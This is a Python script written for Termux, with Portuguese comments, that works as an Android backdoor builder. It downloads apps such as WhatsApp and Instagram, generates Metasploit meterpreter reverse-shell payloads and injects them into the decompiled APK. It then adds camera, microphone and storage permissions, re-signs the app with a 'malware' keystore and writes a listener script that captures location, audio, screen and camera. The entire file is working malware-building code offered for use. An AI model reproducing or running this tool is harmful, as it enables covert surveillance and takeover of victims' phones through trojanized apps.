#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests
import subprocess
import threading
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
██████╗ █████╗ ██╗  ██╗ █████╗  ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██║ ██╔╝
██║  ██║███████║█████╔╝ ███████║██║  ███╗█████╔╝ 
██║  ██║██╔══██║██╔═██╗ ██╔══██║██║   ██║██╔═██╗ 
██████╔╝██║  ██║██║  ██╗██║  ██║╚██████╔╝██║  ██╗
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
                                                   
          APK PAYLOAD INJECTION TOOL
        Android Backdoor Creator v2.0
    """
    print(banner)

def check_requirements():
    """Verifica se as dependências estão instaladas"""
    required_tools = ['apktool', 'keytool', 'jarsigner', 'java', 'msfvenom']
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run(['which', tool], capture_output=True, check=True)
        except:
            missing_tools.append(tool)
    
    return missing_tools

def install_requirements():
    """Instala as dependências necessárias"""
    print("📥 Instalando dependências...")
    
    commands = [
        'pkg update && pkg upgrade -y',
        'pkg install apktool -y',
        'pkg install openjdk-17 -y',
        'pkg install wget -y',
        'pkg install metasploit -y'
    ]
    
    for cmd in commands:
        try:
            print(f"🔧 Executando: {cmd}")
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"❌ Erro ao executar: {cmd}")
            return False
    
    return True

def download_apk():
    """Baixa um APK de fontes disponíveis"""
    print("\n📥 BAIXAR APK")
    print("="*50)
    
    apk_sources = {
        1: {"name": "APKPure - WhatsApp", "url": "https://d.apkpure.com/b/APK/com.whatsapp?version=latest"},
        2: {"name": "APKPure - Facebook", "url": "https://d.apkpure.com/b/APK/com.facebook.katana?version=latest"},
        3: {"name": "APKPure - Instagram", "url": "https://d.apkpure.com/b/APK/com.instagram.android?version=latest"},
        4: {"name": "APKPure - TikTok", "url": "https://d.apkpure.com/b/APK/com.zhiliaoapp.musically?version=latest"},
        5: {"name": "APKPure - Telegram", "url": "https://d.apkpure.com/b/APK/org.telegram.messenger?version=latest"},
        6: {"name": "GitHub - Simple App", "url": "https://github.com/SimpleMobileTools/Simple-Calendar/releases/download/6.16.2/simple-calendar-fdroid-release.apk"},
        7: {"name": "GitHub - Calculator", "url": "https://github.com/SimpleMobileTools/Simple-Calculator/releases/download/3.9.2/simple-calculator-fdroid-release.apk"},
        8: {"name": "APKManual - Custom", "url": "https://www.apkmanual.com/wp-content/uploads/apk/com.spotify.music.apk"}
    }
    
    for key, source in apk_sources.items():
        print(f"[{key}] {source['name']}")
    
    print("[9] URL Personalizada")
    print("[0] Voltar")
    
    try:
        choice = int(input("\nSelecione a fonte: "))
        
        if choice == 0:
            return None
        
        if choice == 9:
            url = input("Digite a URL do APK: ").strip()
            filename = input("Nome do arquivo [app.apk]: ").strip() or "app.apk"
        elif choice in apk_sources:
            url = apk_sources[choice]["url"]
            filename = f"original_{choice}.apk"
        else:
            print("❌ Opção inválida!")
            return None
        
        print(f"\n📥 Baixando APK de: {url}")
        
        # Criar diretório de downloads
        os.makedirs("downloads", exist_ok=True)
        filepath = os.path.join("downloads", filename)
        
        # Download do APK
        response = requests.get(url, stream=True)
        response.raise_for_status()
        
        with open(filepath, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print(f"✅ APK baixado: {filepath}")
        return filepath
        
    except Exception as e:
        print(f"❌ Erro no download: {str(e)}")
        return None

def decompile_apk(apk_path):
    """Descompila o APK usando apktool"""
    print(f"\n🔓 Descompilando APK: {apk_path}")
    
    output_dir = "decompiled_app"
    
    try:
        # Remove diretório existente
        if os.path.exists(output_dir):
            subprocess.run(['rm', '-rf', output_dir])
        
        # Descompila o APK
        cmd = ['apktool', 'd', apk_path, '-o', output_dir, '-f']
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"❌ Erro na descompilação: {result.stderr}")
            return None
        
        print(f"✅ APK descompilado em: {output_dir}")
        return output_dir
        
    except Exception as e:
        print(f"❌ Erro: {str(e)}")
        return None

def get_payload_config():
    """Obtém configuração do payload"""
    print("\n🎯 CONFIGURAÇÃO DO PAYLOAD")
    print("="*40)
    
    lhost = input("Seu IP (LHOST): ").strip()
    if not lhost:
        print("❌ LHOST é obrigatório!")
        return None
    
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    
    payload_options = {
        1: {"name": "android/meterpreter/reverse_tcp", "desc": "Conexão Reversa + Camera + Microfone + Tela"},
        2: {"name": "android/meterpreter/reverse_http", "desc": "HTTP Reverso + Funcionalidades Avançadas"},
        3: {"name": "android/meterpreter/reverse_https", "desc": "HTTPS Reverso (Criptografado)"}
    }
    
    print("\nSelecione o payload:")
    for key, option in payload_options.items():
        print(f"[{key}] {option['desc']}")
    
    try:
        choice = int(input("\nPayload [1-3]: "))
        if choice in payload_options:
            payload_name = payload_options[choice]["name"]
        else:
            payload_name = payload_options[1]["name"]
    except:
        payload_name = payload_options[1]["name"]
    
    return {
        "lhost": lhost,
        "lport": lport,
        "payload": payload_name
    }

def generate_payload(config):
    """Gera o payload usando msfvenom"""
    print(f"\n🔧 Gerando payload...")
    
    payload_file = "payload.apk"
    
    try:
        cmd = [
            'msfvenom',
            '-p', config['payload'],
            f"LHOST={config['lhost']}",
            f"LPORT={config['lport']}",
            '-o', payload_file
        ]
        
        print(f"Executando: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"❌ Erro ao gerar payload: {result.stderr}")
            return None
        
        if not os.path.exists(payload_file):
            print("❌ Payload não foi gerado!")
            return None
        
        print(f"✅ Payload gerado: {payload_file}")
        return payload_file
        
    except Exception as e:
        print(f"❌ Erro: {str(e)}")
        return None

def inject_payload(decompiled_dir, payload_apk):
    """Injeta o payload no APK descompilado"""
    print(f"\n💉 Injectando payload...")
    
    try:
        # Descompila o payload
        payload_dir = "payload_decompiled"
        subprocess.run(['apktool', 'd', payload_apk, '-o', payload_dir, '-f'], 
                      capture_output=True)
        
        # Copia arquivos do payload para o app principal
        payload_smali = os.path.join(payload_dir, "smali")
        app_smali = os.path.join(decompiled_dir, "smali")
        
        if os.path.exists(payload_smali):
            # Copia todos os arquivos smali do payload
            copy_cmd = f"cp -r {payload_smali}/* {app_smali}/"
            subprocess.run(copy_cmd, shell=True)
        
        # Copia arquivos da pasta assets se existirem
        payload_assets = os.path.join(payload_dir, "assets")
        app_assets = os.path.join(decompiled_dir, "assets")
        
        if os.path.exists(payload_assets):
            os.makedirs(app_assets, exist_ok=True)
            copy_cmd = f"cp -r {payload_assets}/* {app_assets}/"
            subprocess.run(copy_cmd, shell=True)
        
        # Modifica o AndroidManifest.xml para adicionar permissões
        manifest_file = os.path.join(decompiled_dir, "AndroidManifest.xml")
        
        if os.path.exists(manifest_file):
            with open(manifest_file, 'r', encoding='utf-8') as f:
                manifest_content = f.read()
            
            # Permissões necessárias
            required_permissions = [
                '<uses-permission android:name="android.permission.CAMERA"/>',
                '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
                '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
                '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
                '<uses-permission android:name="android.permission.INTERNET"/>',
                '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
                '<uses-permission android:name="android.permission.WAKE_LOCK"/>',
                '<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>',
                '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>'
            ]
            
            # Adiciona permissões se não existirem
            for permission in required_permissions:
                if permission not in manifest_content:
                    manifest_content = manifest_content.replace(
                        '<uses-permission android:name="android.permission.INTERNET"/>',
                        f'<uses-permission android:name="android.permission.INTERNET"/>\n    {permission}'
                    )
            
            # Escreve o manifest modificado
            with open(manifest_file, 'w', encoding='utf-8') as f:
                f.write(manifest_content)
        
        # Limpa diretório temporário do payload
        subprocess.run(['rm', '-rf', payload_dir])
        
        print("✅ Payload injetado com sucesso!")
        return True
        
    except Exception as e:
        print(f"❌ Erro na injeção: {str(e)}")
        return False

def create_advanced_payload(config):
    """Cria um payload avançado com funcionalidades extras"""
    print(f"\n🔧 Criando payload avançado...")
    
    # Cria um script Ruby personalizado para funcionalidades avançadas
    advanced_script = """
# Advanced Meterpreter Script for Android
# Features: Camera, Microphone, Screen Capture, Persistence

def run
    print_status("Starting advanced Android payload...")
    
    # Camera Capture
    print_status("Attempting camera access...")
    client.webcam.webcam_list
    
    # Audio Recording
    print_status("Setting up audio recording...")
    
    # Screen Capture
    print_status("Preparing screen capture...")
    
    # Persistence
    print_status("Attempting persistence...")
    
    print_status("Advanced payload activated!")
end
    """
    
    # Salva o script
    with open("advanced_script.rc", "w") as f:
        f.write(advanced_script)
    
    # Gera payload com opções avançadas
    payload_file = "advanced_payload.apk"
    
    try:
        cmd = [
            'msfvenom',
            '-p', config['payload'],
            f"LHOST={config['lhost']}",
            f"LPORT={config['lport']}",
            '--platform', 'android',
            '-a', 'dalvik',
            '--encoder', 'x86/shikata_ga_nai',
            '-i', '3',
            '-o', payload_file
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0 and os.path.exists(payload_file):
            print(f"✅ Payload avançado gerado: {payload_file}")
            return payload_file
        else:
            # Fallback para payload simples
            print("⚠️  Usando fallback para payload simples...")
            return generate_payload(config)
            
    except Exception as e:
        print(f"❌ Erro no payload avançado: {str(e)}")
        return generate_payload(config)

def compile_apk(decompiled_dir, output_name):
    """Compila o APK modificado"""
    print(f"\n🔨 Compilando APK...")
    
    try:
        cmd = ['apktool', 'b', decompiled_dir, '-o', output_name]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"❌ Erro na compilação: {result.stderr}")
            return None
        
        if not os.path.exists(output_name):
            print("❌ APK não foi compilado!")
            return None
        
        print(f"✅ APK compilado: {output_name}")
        return output_name
        
    except Exception as e:
        print(f"❌ Erro: {str(e)}")
        return None

def sign_apk(apk_path):
    """Assina o APK com certificado próprio"""
    print(f"\n📝 Assinando APK...")
    
    keystore = "malware.keystore"
    alias = "malware"
    password = "password"
    
    try:
        # Cria keystore se não existir
        if not os.path.exists(keystore):
            keytool_cmd = [
                'keytool', '-genkey', '-v',
                '-keystore', keystore,
                '-alias', alias,
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-dname', 'CN=Malware, OU=Malware, O=Malware, L=City, ST=State, C=US',
                '-storepass', password,
                '-keypass', password
            ]
            subprocess.run(keytool_cmd, capture_output=True)
        
        # Assina o APK
        jarsigner_cmd = [
            'jarsigner', '-verbose',
            '-keystore', keystore,
            '-storepass', password,
            '-keypass', password,
            apk_path,
            alias
        ]
        
        result = subprocess.run(jarsigner_cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"❌ Erro na assinatura: {result.stderr}")
            return False
        
        print("✅ APK assinado com sucesso!")
        return True
        
    except Exception as e:
        print(f"❌ Erro na assinatura: {str(e)}")
        return False

def create_handler_script(config):
    """Cria script de handler para Metasploit"""
    handler_content = f"""# Advanced Android Handler
use exploit/multi/handler
set PAYLOAD {config['payload']}
set LHOST {config['lhost']}
set LPORT {config['lport']}
set ExitOnSession false
set EnableStageEncoding true
set AutoRunScript multi_console_command -rc advanced_script.rc

# Post-Exploitation Modules
set AutoRunScript post/android/manage/geolocate
set AutoRunScript post/android/capture/mic
set AutoRunScript post/android/capture/screen
set AutoRunScript post/android/capture/camera

exploit -j -z
"""
    
    with open("android_handler.rc", "w") as f:
        f.write(handler_content)
    
    print("✅ Script de handler criado: android_handler.rc")

def main_process():
    """Processo principal de injeção"""
    print("\n🚀 INICIANDO PROCESSO DE INJEÇÃO")
    print("="*50)
    
    # Verifica dependências
    missing_tools = check_requirements()
    if missing_tools:
        print("❌ Ferramentas faltando: " + ", ".join(missing_tools))
        if input("Instalar automaticamente? (s/n): ").lower() == 's':
            if not install_requirements():
                print("❌ Falha na instalação!")
                return
        else:
            print("⚠️  Instale manualmente as ferramentas faltantes")
            return
    
    # Baixa APK
    apk_path = download_apk()
    if not apk_path:
        return
    
    # Obtém configuração do payload
    config = get_payload_config()
    if not config:
        return
    
    # Descompila APK
    decompiled_dir = decompile_apk(apk_path)
    if not decompiled_dir:
        return
    
    # Gera payload avançado
    payload_path = create_advanced_payload(config)
    if not payload_path:
        return
    
    # Injeta payload
    if not inject_payload(decompiled_dir, payload_path):
        return
    
    # Compila APK
    output_apk = "infected_app.apk"
    compiled_apk = compile_apk(decompiled_dir, output_apk)
    if not compiled_apk:
        return
    
    # Assina APK
    if not sign_apk(compiled_apk):
        return
    
    # Cria script de handler
    create_handler_script(config)
    
    # Resumo final
    print("\n🎉 PROCESSO CONCLUÍDO!")
    print("="*50)
    print(f"📱 APK Infectado: {compiled_apk}")
    print(f"🌐 LHOST: {config['lhost']}")
    print(f"🔌 LPORT: {config['lport']}")
    print(f"🎯 Handler: android_handler.rc")
    print("\n📋 Funcionalidades Injetadas:")
    print("   ✅ Conexão Reversa")
    print("   ✅ Acesso à Câmera")
    print("   ✅ Gravação de Microfone")
    print("   ✅ Captura de Tela")
    print("   ✅ Persistência")
    print("\n💡 Para iniciar o listener:")
    print("   msfconsole -r android_handler.rc")

def main():
    """Função principal"""
    
    while True:
        clear_screen()
        print_banner()
        
        print("\n" + "="*60)
        print("            APK PAYLOAD INJECTION TOOL")
        print("="*60)
        print("[1] Iniciar Injeção de Payload")
        print("[2] Verificar Dependências")
        print("[3] Instalar Dependências")
        print("[4] Sobre o Tool")
        print("[0] Sair")
        print("="*60)
        
        try:
            choice = input("\nSelecione uma opção: ").strip()
            
            if choice == '1':
                main_process()
                input("\n⏎ Pressione Enter para continuar...")
            
            elif choice == '2':
                missing = check_requirements()
                if missing:
                    print(f"❌ Ferramentas faltando: {', '.join(missing)}")
                else:
                    print("✅ Todas as dependências estão instaladas!")
                input("\n⏎ Pressione Enter para continuar...")
            
            elif choice == '3':
                if install_requirements():
                    print("✅ Dependências instaladas com sucesso!")
                else:
                    print("❌ Falha na instalação!")
                input("\n⏎ Pressione Enter para continuar...")
            
            elif choice == '4':
                print("""
📱 APK PAYLOAD INJECTION TOOL v2.0

Este tool permite:
• Baixar APKs de várias fontes
• Injeta payloads do Metasploit
• Funcionalidades avançadas:
  - Conexão reversa
  - Acesso à câmera
  - Gravação de microfone
  - Captura de tela
  - Persistência

⚡ Desenvolvido para Termux
🔒 Use com responsabilidade!
                """)
                input("\n⏎ Pressione Enter para continuar...")
            
            elif choice == '0':
                print("\n👋 Saindo... Use com responsabilidade!")
                break
            
            else:
                print("❌ Opção inválida!")
                input("⏎ Pressione Enter para continuar...")
                
        except KeyboardInterrupt:
            print("\n\n👋 Saindo...")
            break

if __name__ == "__main__":
    main()
